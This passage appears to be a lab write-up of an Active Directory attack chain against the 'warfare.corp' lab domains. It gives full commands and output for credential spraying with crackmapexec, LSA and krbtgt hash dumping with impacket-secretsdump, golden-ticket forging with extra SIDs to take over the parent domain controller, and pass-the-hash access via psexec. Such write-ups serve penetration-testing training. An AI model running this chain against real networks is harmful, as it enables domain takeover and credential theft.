#### Initial Access of the newly accessible network
``#nmap -sn 192.168.98.0/24 
![[Pasted image 20250823204128.png]]

Remember this credential we found earlier in firefox files:
![[Pasted image 20250823204444.png]]
Creds: 
	Username: john
	Password: User1@#$%6
	
Let’s spray the discovered credentials in the network using crackmapexec toolkit.
``# vim targets.txt
![[Pasted image 20250823204240.png]]

``#crackmapexec --verbose smb targets.txt -u john -p 'User1@#$%6'
![[Pasted image 20250823205056.png]]

Perfect! User **John** is a local administrator at “192.168.98.30” machine, the name is “MGMT

Now, let’s dump the LSA (Authentication Handler & Secrets Manager) process using crackmapexec toolkit, it utilizes impacket's module secretsdump for the same

``#crackmapexec --verbose smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa
![[Pasted image 20250823210132.png]]


To recap: 
*) Validated Credentials
Username: john
Password: User1@#$%6
Domain: child.warfare.corp
Host: 192.168.98.30 (Hostname: MGMT)
Access: Local Administrator (Pwn3d!)

*) Dumped Cached Logon Hashes
CHILD.WARFARE.CORP/john:$DCC2$10240#john#9855312d42ee254a7334845613120e61
CHILD.WARFARE.CORP/corpmngr:$DCC2$10240#corpmngr#7fd50bbab99e8ea7ae9c1899f6dea7c6


*) Machine Account Hashes (CHILD\MGMT$)
aes256-cts-hmac-sha1-96: 344c70047ade222c4ab35694d4e3e36de556692f02ec32fa54d3160f36246eec
aes128-cts-hmac-sha1-96: aa5b3d84614911fe611eafbda613baaf
des-cbc-md5:             6402e0c20b89d386
NTLM:                    aad3b435b51404eeaad3b435b51404ee:0f5fe480dd7eaf1d59a401a4f268b563


*) DPAPI Secrets (Data Protection API keys)
dpapi_machinekey: 0x34e3cc87e11d51028ffb38c60b0afe35d197627d
dpapi_userkey:    0xb890e07ba0d31e31c758d305c2a29e1b4ea813a5

*) NL$KM Secret (used to encrypt cached credentials)
NL$KM:
df885acfa168074cc84de093af76093e726cd092e9ef9c72d6fe59c6cbb70382
d896c9569b67dcdac871dd77b96916c8c1187d40c118474c481ddf62a7c04682


**AND we got the clear-text credentials of the user “corpmngr” **
![[Pasted image 20250823211111.png]]
Creds: (MGMT Machine)
- Username: corpmngr
- Password: User4&*&*

Again, let’s spray the credentials in the network using the new creds 
``#crackmapexec --verbose smb targets.txt -u corpmngr -p 'User4&*&*'

![[Pasted image 20250824093125.png]]

--> We got working creds as local **Administrator** in the **CDC** machine at **192.168.98.120**
Creds: (CDC Machine)
- Username: corpmngr
- Password: User4&*&*


Since we know the machine name & the domain, let’s update the same on our hosts file.

``#vim /etc/hosts
```
192.168.98.2 warfare.corp dc01.warfare.corp  
192.168.98.120 child.warfare.corp cdc.child.warfare.corp
```

![[Pasted image 20250824093042.png]]

Since we are local administrator in the Child DC (.120), let's extract the hash of **KRB TGT** (Ticket Grant Ticket) account using impacket secretsdump script. We will forge a **KRB TGS** (Golden Ticket) to compromise the Parent DC (.2)

``#impacket-secretsdump -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'

![[Pasted image 20250824093750.png]]

```
[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=child,DC=warfare,DC=corp
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
...
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
```

We will now perform SID Extraction using lookupsid python script.

```
Child Grabbing:
# impacket-lookupsid child/corpmngr:'User4&*&*'@child.warfare.corp  

Parent Grabbing:
# impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp  
```

Child SID Found:
![[Pasted image 20250824094245.png]]

Parent SID Found: 
![[Pasted image 20250824094429.png]]

For now, here's what we have: 
```
- krbtgt aes256 Hash  
ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2  
- Parent SID : S-1-5-21-3375883379-808943238-3239386119  
- Child SID : S-1-5-21-3754860944-83624914-1883974761  
```

We will forge golden ticket using ticketer as follows and then set the ccache file to the environment variable :  
``# impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'
``# export KRB5CCNAME=corpmngr.ccache 

![[Pasted image 20250824095041.png]]

Request Service Ticket using the ccache file & export: 
![[Pasted image 20250824095305.png]]

Parent Domain Controller Takeover: 
``# impacket-secretsdump -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator' -debug
![[Pasted image 20250824095532.png]]

```
[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Using Kerberos Cache: corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
[+] Domain retrieved from CCache: CHILD.WARFARE.CORP
[+] Returning cached credential for CIFS/DC01.WARFARE.CORP@WARFARE.CORP
[+] Using TGS from cache
[+] Changing sname from CIFS/dc01.warfare.corp@WARFARE.CORP to CIFS/DC01.WARFARE.CORP@CHILD.WARFARE.CORP and hoping for the best
[+] Username retrieved from CCache: corpmngr
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Calling DRSCrackNames for warfare\Administrator 
[+] Calling DRSGetNCChanges for {17446816-c072-445e-ac9b-c0e28630bed6} 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=warfare,DC=corp
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b2ab0552928c8399da5161a9eb7fd283:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:b8844cc6622c448c9b9f657e7a67ad7f9f26fa2c1c7520b7f1ad28389c6fdb91
Administrator:aes128-cts-hmac-sha1-96:cea9408d32669cad4f2938252928b38d
Administrator:des-cbc-md5:614ce65740c8b0a8
[*] Cleaning up... 
```

Let’s access with Administrator credentials the **Parent DC** (dc01)
``# impacket-psexec -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:b2ab0552928c8399da5161a9eb7fd283

![[Pasted image 20250824095742.png]]